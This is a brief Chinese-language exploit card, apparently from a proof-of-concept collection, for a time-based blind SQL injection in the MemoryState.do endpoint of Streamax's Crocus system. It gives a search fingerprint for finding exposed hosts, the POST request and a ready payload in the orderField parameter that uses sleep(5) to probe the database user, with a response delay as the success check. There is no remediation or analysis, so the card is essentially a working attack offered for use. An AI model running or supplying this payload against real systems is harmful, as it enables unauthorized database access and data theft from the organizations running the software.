# 锐明技术Crocus系统MemoryState.do存在SQL注入漏洞

锐明技术Crocus系统 ｜ SQL注入 ｜ —
- **指纹**：`body="/ThirdResource/respond/respond.min.js"`
- **请求**：`POST /MemoryState.do?Action=Query HTTP/1.1`

**Payload**
```
EndTime=&PageIndex=0&PageSize=20&RepairState=-1&StartTime=&orderField=(select*from(select%09if(ascii(substr(current_user,1,1))>1,sleep(5),1))a)&orderType=asc
```
- **响应特征**：200 响应时间>=5s